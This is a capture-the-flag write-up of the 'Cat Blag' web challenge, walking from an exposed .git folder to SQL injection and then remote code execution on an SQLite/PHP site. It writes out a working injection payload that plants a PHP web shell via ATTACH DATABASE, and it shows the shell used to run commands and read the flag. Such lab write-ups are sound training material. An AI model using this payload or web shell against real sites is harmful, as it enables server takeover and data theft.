# Cat Blag
> Check out my awesome cat blog 🐱 :uwu:
(Thank god PHP still exists and I don't have to learn another language.)
https://catblag.ecsc22.hack.cert.pl/

## Recon
There's one particular comment in the HTML source that seems interesting:
```html
<!-- I try to develop my websites at a very high standard. I use version control software and my cats help me program. -->
```
Since the author claims to be using PHP (perhaps running as CGI) and version control, it's possible that he forgot to restrict access to the *.git* folder. Indeed navigating to */.git* returns the *Forbidden* error whereas trying to access a non-existent path like */aaaaa* results in *Not Found* error.

## Downloading the source code
Since we have access to the *.git* directory it's possible to dump the repository using tools like [git-dumper](https://github.com/arthaud/git-dumper). After cloning the tool and installing packages listed in it's *requirements.txt* we can run it with the following command to save Cat Blag's source into *blag* directory:
```sh
./git-dumper/git_dumper.py https://catblag.ecsc22.hack.cert.pl/.git/ blag
```

## Investigating the repo and source code
There's no trace of the flag in the git repository so let's take a look at the *index.php* file. Lines 42-48 contain an interesting piece of code:
```php
if (isset($_GET["visit_source"])) {
    $visitRef = $_GET["visit_source"];
} else {
    $visitRef = "";
}

$db->exec("INSERT INTO visits VALUES ('" . date('Y-m-d H:i:s') . "', '" . $visitRef . "')");
```
It's clear that by setting the *visit_source* parameter appropriately we can perform an SQL injection since the query isn't executed through a prepared statement and *$visitRef* isn't escaped in any way. Taking a look at line 26 we know that the RDBMS used is SQLite, through which we can easily get RCE by following the steps described in this [article](https://research.checkpoint.com/2019/select-code_execution-from-using-sqlite/).

## Gaining RCE
By attaching another database from a non-existent file, we can essentially create a new PHP script that will evaluate any code we desire on the server. URL-encoding the following payload and passing it as *visit_source* parameter does the trick:
`'); ATTACH DATABASE 'uploads/canhazpwn.php' AS pwn; CREATE TABLE pwn.pwn(data); INSERT INTO pwn.pwn(data) VALUES('<?php system($_GET["cmd"]); ?>'); -- `
To confirm that the exploit works, lets navigate to `https://catblag.ecsc22.hack.cert.pl/uploads/canhazpwn.php?cmd=id`. The script returns a string with SQLite's binary data and the output of the *id* command at the end. Now lets list the directory containing *index.php* by setting *cmd* to *ls+..* (we need to add the *..* since *canhazpwn.php* resides in the *uploads* directory). We can see that it contains a file named *this-is-the-flag-but-with-an-unpredictable-name.txt*. Catting this file yields the flag.

## Flag
`ecsc{those_darn_catz}`
